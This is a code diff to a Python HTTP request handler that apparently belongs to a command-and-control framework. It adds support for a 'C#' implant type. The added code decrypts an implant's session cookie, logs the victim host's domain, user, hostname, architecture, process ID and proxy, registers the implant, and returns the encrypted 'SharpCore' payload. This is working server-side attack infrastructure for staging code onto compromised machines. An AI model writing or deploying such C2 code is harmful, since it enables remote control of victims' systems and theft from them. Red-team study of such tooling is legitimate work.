@@ -125,8 +125,24 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             implant_type = "Daisy"
           if s.path == ("%s?m" % new_implant_url):
             implant_type = "OSX"
+          if s.path == ("%s?c" % new_implant_url):
+            implant_type = "C#"
+          
+          if implant_type == "C#":
+            cookieVal = (s.cookieHeader).replace("SessionID=","")
+            decCookie = decrypt(KEY, cookieVal)
+            IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
+            Domain,User,Hostname,Arch,PID,Proxy = decCookie.split(";")
+            newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"), User.decode("utf-8"), Hostname.decode("utf-8"), Arch, PID, Proxy)
+            newImplant.save()
+            newImplant.display()
+            responseVal = encrypt(KEY, newImplant.SharpCore)
+            s.send_response(200)
+            s.send_header("Content-type", "text/html")
+            s.end_headers()
+            s.wfile.write(responseVal)
             
-          if implant_type == "OSX":
+          elif implant_type == "OSX":
             cookieVal = (s.cookieHeader).replace("SessionID=","")
             decCookie = decrypt(KEY, cookieVal)
             IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
